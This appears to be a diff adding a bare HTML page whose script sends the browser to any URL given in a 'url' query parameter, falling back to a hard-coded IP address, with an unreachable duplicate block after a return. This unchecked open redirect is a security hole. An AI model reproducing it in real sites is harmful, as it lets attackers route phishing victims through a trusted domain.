@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+</head>
+<body>
+</body>
+<script>
+    function getQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return unescape(r[2]);
+        return null;
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) {
+            return decodeURIComponent(r[2]);
+        }
+        return '';
+    }
+    function checkUrl(str) {
+        var reg = /^(http|https):\/\/.*$/i;
+        return reg.test(str);
+    }
+    var origin_url = getQueryString('url');
+    if (checkUrl(origin_url)) {
+        window.location.href = origin_url;
+    } else {
+        window.location.href = "http://118.193.39.158/index.html";
+    }
+</script>
+
+</html>
